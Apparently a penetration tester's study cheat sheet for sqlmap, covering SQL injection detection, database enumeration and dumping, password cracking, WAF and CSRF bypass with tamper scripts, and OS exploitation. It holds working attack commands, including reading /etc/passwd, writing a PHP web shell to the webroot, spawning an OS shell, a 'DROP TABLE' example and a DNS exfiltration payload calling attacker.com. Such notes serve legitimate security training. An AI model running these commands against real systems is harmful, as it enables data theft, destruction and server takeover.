`python sqlmap.py`

# Basics
- View the HTTP request, including data, type, etc. in BurpSuite
- Then run the appropriate command manually or save it and do `-r`
- `--batch` to auto select options

| Command                                                                                                                   | Action                                                      |
| ------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| `sqlmap -h`                                                                                                               | View the basic help menu                                    |
| `sqlmap -hh`                                                                                                              | View the advanced help menu                                 |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`                                                                | Run `SQLMap` without asking for user input                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`                                                               | `SQLMap` with POST request                                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`                                                              | POST request specifying an injection point with an asterisk |
| `sqlmap -r req.txt`                                                                                                       | Passing an HTTP request file to `SQLMap`                    |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`                                                        | Specifying a cookie header                                  |
| `sqlmap -u www.target.com --data='id=1' --method PUT`                                                                     | Specifying a PUT request                                    |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt`                                             | Store traffic to an output file                             |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`                                                            | Specify verbosity level                                     |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`                                                     | Specifying a prefix or suffix                               |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5`                                                                          | Specifying the level and risk                               |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`                                  | Basic DB enumeration                                        |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`                                                             | Table enumeration                                           |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`                                      | Table/row enumeration                                       |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`                             | Conditional enumeration                                     |
| `sqlmap -u "http://www.example.com/?id=1" --schema`                                                                       | Database schema enumeration                                 |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user`                                                               | Searching for data                                          |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch`                                                            | Password enumeration and cracking                           |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass                                      |
| `sqlmap --list-tampers`                                                                                                   | List all tamper scripts                                     |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`                                                              | Check for DBA privileges                                    |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`                                                      | Reading a local file                                        |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`                 | Writing a file                                              |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell`                                                                     | Spawning an OS shell                                        |


# Supported types
`sqlmap -hh`
- BEUSTQ
	- B: Boolean based blind
		- `AND 1=1`
		- TRUE -> response large difference from regular server response
	- E: Error based
		- `AND GTID_SUBSET(@@version,0)`
		- If DBMS errors returned, probably can use to carry results for requested queries
	- U: Union query based
		- `UNION ALL SELECT 1,@@version,3`
		- Extend vulnerable query to get injected statements' results
	- S: Stacked queries
		- `; DROP TABLE users`
		- Can use to run non-query statements executed in advanced featuers (eg. execution of OS commands) on top of data retrieval
	- T: Time based blind
		- `AND 1=IF(2>1,SLEEP(5),0)`
		- TRUE -> response time large difference with regular
		- Used when Boolean-based blind not applicable, eg. vulnerable statement is not a query (eg. Insert, Update, Delete)
	- Q: Inline queries
		- `SELECT (SELECT @@version) from`
		- Uncommon
	- Out-Of-Band SQL Injection
		- `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`
		- Most advanced
		- Suppported through DNS exfiltration; requested queries retrieved through DNS traffic
		- SQl Map ran on DNS server for the domain under control (eg. attacker.com), forcing server to request the non-existent subdomains (eg. foo.attaccker.com), where foo is the SQL response we want

# Errors
- `--parse-errors`
- `-t /tmp/traffic.txt`
	- Stores whole traffic content to an output file
- `-v 6`
	- Verbose output, see everything
- `--proxy`
	- `Redirect traffic thorugh MiTM proxy (eg. Burp)`


# Attack Tuning
## Prefix/Suffix
- `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`

## Level/Risk
- `--level 5 --risk 3`
- Level goes from 1 - 5
	- Extends vectors and boundaries being used
- Risk goes from 1 - 3
	- How likely to break their system

## Advanced Tuning
- Status codes
	- `--code` to specify detection of TRUE responses to a specific HTTP code
- Titles
	- `--titles`  to base comparison based on content of the HTML tag
- String
	- `--text-only` which removes all the HTML tags, bases comparison only on textual content
- Technique
	- `--technique` to specify SQLi technique (see options above)
- `UNION SQLi tuning`
	- If we can find number of columns, can help
	- `--union-cols`
	- If need to use an appendix at the end of a UNION query (eg. `FROM <table>`), can set with option `--union-from`

# DB Enumeration
- `--banner`
	- DB version banner
- `--current-user
	- Current username
- `--current-db`
	- Current database name
- `--is-dba`
	- Check if administrator
- `--dbs`
	- Enumerate databases

## Table enumeration
- `--tables -D <db name>`
	- Enumerate tables
- `--dump -T <table_name> -D <db_name>`
	- Enumerate specific table
- `--dump -T <table_name> -D <db_name> -C <col1, col2>`
	- Enumerate specific columns
- `--where="name LIKE 'f%'"`
	- Conditional enumeration
- `--dump-all --exclude-sysdb`
	- All tables from all databases except sys databases


- `--schema`
	- Overview of all tables
- `--search -T user`
	- Search for all table names containing the keyword 'user'
- `--search -C pass`
	- Search for all columns with 'pass' in it
- For row entries, need to do `--where... ` above

|Flag|Meaning|Used With|Searches For|
|---|---|---|---|
|`-T`|Table name|`--search` or `--dump`|**TABLES**|
|`-C`|Column name|`--search` or `--dump`|**COLUMNS**|
|`-D`|Database name|`--search` or `--dump`|**DATABASES**|
|`--where`|SQL condition|Only with `--dump`|**ROW VALUES**|
# Bypassing Web App Protections
- `--csrf-token="<name_of_field>"`
	- CRSF token: sent by server as response to get request, then auto sent in POST request following that
	- Check the name of the field in Burp, then tell SQLMap to use that field
- `--randomize=<name_of_field>`
	- Similar idea, but just needs to be a random id. Eg. URL has `/case9.php?id=1&uid=2306445369` where uid just needs to be randomised each time
- `--sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
	- Calculated parameter bypass
	- eg. one parameter needs to contain the hash of anthe one
	- Valid python code evaluted just before request is sent
- `--proxy="..."`
	- Conceal IP address
	- Tor? KIV
- WAF bypass
	- SQl sends predefined malicious looking payload to test for exxistence of WAF
- User-Agent blacklisting bypass
	- Immediate problems (eg. HTTP error code 5xx from the start)
	- Bypass with `--random-agent`

## Tamper Scripts
| **Tamper-Script**           | **Description**                                                                                                                  |     |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------- | --- |
| `0eunion`                   | Replaces instances of UNION with e0UNION                                                                                         |     |
| `base64encode`              | Base64-encodes all characters in a given payload                                                                                 |     |
| `between`                   | Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`                 |     |
| `commalesslimit`            | Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart                                                 |     |
| `equaltolike`               | Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart                                                         |     |
| `halfversionedmorekeywords` | Adds (MySQL) versioned comment before each keyword                                                                               |     |
| `modsecurityversioned`      | Embraces complete query with (MySQL) versioned comment                                                                           |     |
| `modsecurityzeroversioned`  | Embraces complete query with (MySQL) zero-versioned comment                                                                      |     |
| `percentage`                | Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)                                            |     |
| `plus2concat`               | Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart                                                          |     |
| `randomcase`                | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)                                                   |     |
| `space2comment`             | Replaces space character ( ) with comments `/                                                                                    |     |
| `space2dash`                | Replaces space character ( ) with a dash comment (`--`) followed by a random string and a new line (`\n`)                        |     |
| `space2hash`                | Replaces (MySQL) instances of space character ( ) with a pound character (`#`) followed by a random string and a new line (`\n`) |     |
| `space2mssqlblank`          | Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters         |     |
| `space2plus`                | Replaces space character ( ) with plus (`+`)                                                                                     |     |
| `space2randomblank`         | Replaces space character ( ) with a random blank character from a valid set of alternate characters                              |     |
| `symboliclogical`           | Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|`)                                           |     |
| `versionedkeywords`         | Encloses each non-function keyword with (MySQL) versioned comment                                                                |     |
| `versionedmorekeywords`     | Encloses each keyword with (MySQL) versioned comment                                                                             |     |
- `--list-tamper` to show all

# OS exploitation
- `--is-dba`
	- Check for dba privileges
- Reading
	- `--file-read "/etc/passwd"`
- Writing
	- `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
		- Prepare webshell on local machine
	- `-file-write "shell.php" --file-dest "/var/www/html/shell.php"`
		- Assuming  `/var/www/html/` is the webroot 
- Shell (auto)
	- `--os-shell`
		- SQLMap will auto try to find the web root, it` --batch` supplied
	- `--technique=E`
		- Higher chance of direct output